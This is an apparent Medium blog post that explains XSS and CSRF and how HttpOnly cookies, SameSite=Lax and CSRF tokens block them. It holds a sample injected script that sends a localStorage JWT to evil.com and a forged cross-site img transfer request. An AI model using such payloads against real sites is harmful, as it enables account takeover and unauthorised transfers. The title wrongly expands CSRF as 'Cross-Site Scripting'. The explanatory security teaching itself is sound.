# CSRF(Cross-Site Scripting) vs XSS (using cookies)

> **Author**: Piyali Das
> **Published**: Jan 6, 2026

---

![Piyali Das](https://miro.medium.com/v2/resize:fill:32:32/1*Y9ie1B_iBGOjG1Ka9B4Pfg.jpeg)

4

Listen

Share

CSRF (Cross-Site Request Forgery) vs XSS (Cross -Site Scripting)

## XSS (Cross-Site Scripting)

### ❌ XSS with JWT in localStorage (Account takeover)

Attacker injects JavaScript into your site.

```
User visits: myapp.com
--------------------------------
Injected script runs (XSS)

<script>
  const token = localStorage.getItem('jwt');
  fetch('https://evil.com/steal?token=' + token);
</script>
--------------------------------
```

What the browser does

```
Browser JS
  ↓ reads localStorage
  ↓ sends token to attacker
```

Result

```
Attacker now owns the JWT
→ Can call APIs as the user
→ Full account takeover
```

🔥 Game over

### ✅ XSS with HttpOnly Cookie (Attack blocked)

```
User visits: myapp.com
--------------------------------
Injected script runs (XSS)

<script>
  document.cookie   ❌ BLOCKED
</script>
--------------------------------
```

What the browser does

```
HttpOnly cookie
  ↓ NOT exposed to JS
  ↓ Cannot be stolen
```

Result

```
Attacker cannot extract session
User identity remains safe
```

✅ XSS damage limited

### Conclusion

✅ Cookies with HttpOnly STOP XSS token theft
❌ localStorage DOES NOT

## CSRF (Cross-Site Request Forgery)

### ❌ CSRF without protection

Victim is logged in → attacker tricks browser into sending request.

```
Victim logged into bank.com
Cookie: session=abc
```

Attacker site

```
Get Piyali Das’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

evil.com
--------------------------------
<img src="https://bank.com/transfer?amount=10000">
--------------------------------
```

Browser behavior

```
Browser requests bank.com
  ↓ automatically attaches cookies
  ↓ server trusts session
```

Result

```
Money transferred ❌
User never clicked "Transfer"
```

### ✅ CSRF blocked with SameSite=Lax

```
Cookie:
Set-Cookie: session=abc; SameSite=Lax
```

Cross-site request

```
evil.com → bank.com (iframe / img)
--------------------------------
<img src="https://bank.com/transfer?amount=10000">
--------------------------------
```

Browser decision

```
Cross-site request
SameSite=Lax
→ Cookie NOT sent ❌
```

Result

```
Request unauthenticated
Attack fails
```

### CSRF blocked with CSRF Token (Gold standard)

```
Backend sets:
Set-Cookie: CSRF-TOKEN=xyz
```

Legit request

```
Frontend JS
  ↓ reads CSRF cookie
  ↓ sends header X-CSRF-TOKEN: xyz
```

Attacker request

```
evil.com
  ↓ cannot read CSRF cookie
  ↓ cannot forge header
```

Result

```
Server rejects request
CSRF impossible
```

### Why cookies are vulnerable to CSRF

Cookies:

- Are automatically attached
- Don’t care who initiated request



---
*Original URL: [https://medium.com/@piyalidas.it/csrf-cross-site-scripting-vs-xss-using-cookies-1189d3b7fc7e?source=search_post---------94-----------------------------------](https://medium.com/@piyalidas.it/csrf-cross-site-scripting-vs-xss-using-cookies-1189d3b7fc7e?source=search_post---------94-----------------------------------)*
